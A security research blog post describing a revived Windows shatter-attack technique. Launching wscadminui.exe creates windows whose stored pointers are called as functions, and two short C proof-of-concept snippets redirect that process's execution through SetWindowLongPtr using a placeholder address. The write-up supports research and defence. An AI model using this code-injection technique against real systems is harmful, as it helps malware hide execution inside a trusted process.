---
title: Beating the dead horse, only to inject it some more…
url: https://www.hexacorn.com/blog/2024/11/07/beating-the-dead-horse-only-to-inject-it-some-more/
source: Hexacorn
date: 2024-11-08
fetch_date: 2025-10-06T19:16:42.752295
---

# Beating the dead horse, only to inject it some more…

[Skip to primary content](#content)

# [Hexacorn](https://www.hexacorn.com/blog/)

## Hexacorn

Search

### Main menu

* [Home](https://www.hexacorn.com/)
* [Services](https://www.hexacorn.com/services.html)
* [Products & Freebies](https://www.hexacorn.com/products_and_freebies.html)
* [Case Studies](https://www.hexacorn.com/case_studies.html)
* [Contact Us](https://www.hexacorn.com/contact.html)

### Post navigation

[← Previous](https://www.hexacorn.com/blog/2024/11/05/procmonning-the-win11_24h2-build/)
[Next →](https://www.hexacorn.com/blog/2024/11/09/the-different-type-of-relocation-aka-moving-between-countries-in-practice-1-n/)

# Beating the dead horse, only to inject it some more…

Posted on [2024-11-07](https://www.hexacorn.com/blog/2024/11/07/beating-the-dead-horse-only-to-inject-it-some-more/ "11:50 pm")  by  [adam](https://www.hexacorn.com/blog/author/adam/ "View all posts by adam")

The windows [shatter attack](https://en.wikipedia.org/wiki/Shatter_attack) is so old that it’s time for someone to reinvent it.

This someone could be me.

While looking at *wscadminui.exe* I noticed that it expects 2 arguments: the first one is a */DefaultProductRequest* string, and the second is also a string (a name of an app).

When these are provided, the program calls *wscapi.dll*::*wscLaunchAdminMakeDefaultUI* API and passes the app name to it. The *wscLaunchAdminMakeDefaultUI* in turn, passes the app name to another function called *wscShowAMSCNEx*. The latter creates a window of a class *AMNotificationDialog*.

So, running:

```
wscadminui.exe /DefaultProductRequest foobar
```

will start the *wscadminui.exe* process and it will create the *AMNotificationDialog* window for us:

[![](https://www.hexacorn.com/blog/wp-content/uploads/2024/05/AMNotificationDialog1.png)](https://www.hexacorn.com/blog/wp-content/uploads/2024/05/AMNotificationDialog1.png)

With that in place, we can look at the window procedure handling the messages for the *AMNotificationDialog* window:

[![](https://www.hexacorn.com/blog/wp-content/uploads/2024/05/AMNotificationDialog2.png)](https://www.hexacorn.com/blog/wp-content/uploads/2024/05/AMNotificationDialog2.png)

You can see that it is using *WM\_NCCREATE* message to set a Window Long Pointer at offset 0 to a value provided in that windows message (lParam). What attracts our attention more though is that the very same value is later used as a function pointer — in other words, whatever the offset the Window Long Ptr @0 points to, the code at this offset will be executed!

So, one could inject code into *wscadminui.exe* process and then execute it using a simple call to *SetWindowLongPtr* API:

```
  WinExec ("wscadminui.exe /DefaultProductRequest foobar",0);
  Sleep(1000);
  HWND x = FindWindow("AMNotificationDialog", "");
  if (x != NULL)
  	{
  		SetWindowLongPtr (x, 0, 0x123456789ABCDEF);
  		ShowWindow (x, SW_SHOW);
  	}
```

Now, the very same program invocation:

```
wscadminui.exe /DefaultProductRequest foobar
```

leads to a creation of another window — this time it is of an *ANIMATION\_TIMER\_HWND* class (you can see it on the screenshot above). This window’s lifecycle is handled by the *UIAnimation.dll*, and this is where we can find the implementation of the window’s procedure handling messages for it:

[![](https://www.hexacorn.com/blog/wp-content/uploads/2024/11/AMNotificationDialog3.png)](https://www.hexacorn.com/blog/wp-content/uploads/2024/11/AMNotificationDialog3.png)

Again, we can easily manipulate this *GWLP\_USERDATA* pointer – a simple snippet like the one below can redirect code execution of the scapegoat *wscadminui.exe* to the pointer of our liking:

```
  WinExec ("wscadminui.exe /DefaultProductRequest foobar",0);
  Sleep(1000);
  HWND x = FindWindow("ANIMATION_TIMER_HWND", "");
  if (x != NULL)
  	{
  		SetWindowLongPtr (x, GWLP_USERDATA, 0x123456789ABCDEF);
  		ShowWindow (x, SW_SHOW);
  	}
```

As usual, there are more examples like this out there, but the point I want to make is that over 20 years after the window shatter attack was described for the first time it is still available to attackers in many forms and places.

This entry was posted in [Archaeology](https://www.hexacorn.com/blog/category/archaeology/), [Code Injection](https://www.hexacorn.com/blog/category/code-injection/) by [adam](https://www.hexacorn.com/blog/author/adam/). Bookmark the [permalink](https://www.hexacorn.com/blog/2024/11/07/beating-the-dead-horse-only-to-inject-it-some-more/ "Permalink to Beating the dead horse, only to inject it some more…").

[Privacy Policy](https://www.hexacorn.com/blog/privacy-policy/) [Proudly powered by WordPress](https://wordpress.org/ "Semantic Personal Publishing Platform")